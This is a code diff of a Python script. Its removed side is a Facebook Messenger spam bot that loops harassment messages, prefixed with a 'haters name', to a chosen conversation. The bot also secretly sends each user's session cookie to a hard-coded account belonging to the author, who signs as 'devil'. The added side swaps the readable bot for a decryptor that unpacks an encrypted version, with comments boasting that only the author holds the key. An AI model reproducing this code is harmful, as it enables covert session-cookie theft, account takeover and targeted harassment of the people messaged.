@@ -1,114 +1,59 @@
-import requests
-import json
-import time
-import threading
-import http.server
-import socketserver
+#encrypted:by devil
+#decrypt nhi hogi bro key mere yani devil ke pass hai
 
-# Simple HTTP server setup
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"-- SERVER RUNNING>>CHARSI HERW")
+from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives import serialization
 
-def execute_server():
-    PORT = 4000
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print(f"Server running at http://localhost:{PORT}")
-        httpd.serve_forever()
+# Private key load karein
+def load_rsa_private_key():
+    with open('private_key.pem', 'rb') as f:
+        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
+    return private_key
 
-# Function to send initial messages
-def send_initial_message():
-    # Load the cookies from a JSON file
-    with open('cookies.json', 'r') as file:
-        cookies = json.load(file)
+# AES key ko RSA private key se decrypt karein
+def rsa_decrypt_aes_key(encrypted_key, private_key):
+    aes_key = private_key.decrypt(
+        encrypted_key,
+        rsa_padding.OAEP(
+            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    return aes_key
+
+# Script ko decrypt karein
+def aes_decrypt(encrypted_data, key, iv):
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_plaintext = decryptor.update(encrypted_data) + decryptor.finalize()
+
+    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
     
-    msg_template = "Hello devil sir! I am using your server. My cookie ID is {}"
-    target_id = "100026880828945"
+    return plaintext
 
-    requests.packages.urllib3.disable_warnings()
+# Encrypted file ko load karein
+with open('message_sender_encrypted.bin', 'rb') as f:
+    iv = f.read(16)  # Pehle 16 bytes IV hota hai
+    encrypted_key = f.read(256)  # RSA encrypted AES key
+    ciphertext = f.read()  # Baaki ciphertext
 
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+# Private key load karein
+private_key = load_rsa_private_key()
 
-    for cookie in cookies:
-        cookie_value = cookie['cookie']
-        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
-        msg = msg_template.format(cookie_value)
-        parameters = {'cookie': cookie_value, 'message': msg}
-        response = requests.post(url, json=parameters, headers=headers)
-        time.sleep(1)
+# RSA se AES key ko decrypt karein
+aes_key = rsa_decrypt_aes_key(encrypted_key, private_key)
 
-    print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+# AES decryption
+plaintext = aes_decrypt(ciphertext, aes_key, iv)
 
-# Function to send messages from convo.txt and File.txt
-def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
+# Decrypted script ko wapas save karein
+with open('message_sender_decrypted.py', 'wb') as f:
+    f.write(plaintext)
 
-    with open('File.txt', 'r') as file:
-        messages = file.readlines()
-
-    with open('cookies.json', 'r') as file:
-        cookies = json.load(file)
-
-    with open('hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-    while True:
-        for message_index, message in enumerate(messages):
-            cookie_index = message_index % len(cookies)
-            cookie_value = cookies[cookie_index]['cookie']
-
-            url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
-            parameters = {'cookie': cookie_value, 'message': haters_name + ' ' + message.strip()}
-            response = requests.post(url, json=parameters, headers=headers)
-
-            if response.ok:
-                print(f"\033[1;92m[+] Message {message_index + 1} sent with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
-            else:
-                print(f"\033[1;91m[x] Failed to send Message {message_index + 1} with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
-            time.sleep(speed)
-
-        print("\n[+] All messages sent. Restarting the process...\n")
-
-def main():
-    # Start the HTTP server in a separate thread
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
-
-    # Wait for the server to start properly
-    time.sleep(3)
-
-    # Send initial messages
-    send_initial_message()
-
-    # Start sending messages from files
-    send_messages_from_file()
-
-if __name__ == '__main__':
-    main()
+print("Decryption successful! Script saved as 'message_sender_decrypted.py'")
